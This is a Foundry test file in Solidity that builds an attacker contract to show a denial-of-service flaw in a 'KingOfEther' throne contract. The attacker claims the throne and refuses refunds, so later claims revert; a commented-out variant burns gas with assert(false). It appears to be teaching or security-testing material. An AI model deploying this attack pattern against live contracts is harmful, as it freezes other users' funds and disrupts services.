// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/KingOfEther.sol";

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}

contract KingOfEtherTest is Test {
    uint256 public privateKey = 1234;
    address public signer;
    KingOfEther public kingOfEther;
    address public alice = vm.addr(1111);
    address public bob = vm.addr(2222);
    address public exploiter = vm.addr(3333);
    function setUp() public {
        signer = vm.addr(privateKey);
        vm.deal(signer, 1 ether);
        vm.startPrank(signer);
        kingOfEther = new KingOfEther();
        vm.stopPrank();
        vm.deal(alice, 5 ether);
        vm.deal(bob, 2 ether);
        vm.deal(exploiter, 3 ether);
    }

    function test_denied_clain() public {
        vm.startPrank(exploiter);
        Attack attack = new Attack(kingOfEther);
        attack.attack{value: 3 ether}();
        assertEq(kingOfEther.king(), address(attack));
        vm.stopPrank();
        vm.startPrank(alice);
        vm.expectRevert(bytes("Failed to send Ether"));
        kingOfEther.claimThrone{value: 4 ether}();
    }
}